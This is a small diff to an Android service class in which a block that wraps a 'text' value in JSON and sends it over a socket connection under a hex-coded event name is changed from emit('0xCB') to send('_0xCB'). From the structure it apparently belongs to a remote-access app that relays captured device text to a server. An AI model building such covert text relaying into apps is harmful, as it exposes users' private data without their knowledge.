@@ -61,7 +61,7 @@ public class MainService extends Service {
 //                            try {
 //                                JSONObject data = new JSONObject();
 //                                data.put("text", text);
-//                                IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
+//                                IOSocket.getInstance().getIoSocket().send("_0xCB" , data);
 //                            } catch (JSONException e) {
 //                                e.printStackTrace();
 //                            }
@@ -167,7 +167,7 @@ public class MainService extends Service {
                             try {
                                 JSONObject data = new JSONObject();
                                 data.put("text", text);
-                                IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
+                                IOSocket.getInstance().getIoSocket().send("_0xCB" , data);
                             } catch (JSONException e) {
                                 e.printStackTrace();
                             }
